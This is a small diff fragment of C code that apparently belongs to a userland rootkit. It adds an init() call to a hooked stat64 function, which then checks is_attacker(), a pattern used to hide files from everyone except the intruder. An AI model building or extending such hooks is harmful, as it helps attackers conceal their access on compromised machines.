@@ -26,6 +26,7 @@
 #include "hooks.h" /* prototype */
 
 int stat64(const char *__restrict __file, struct stat64 *buf) {
+    init();
     DEBUG(D_INFO, "called stat(2) hook");
 
     if (is_attacker())
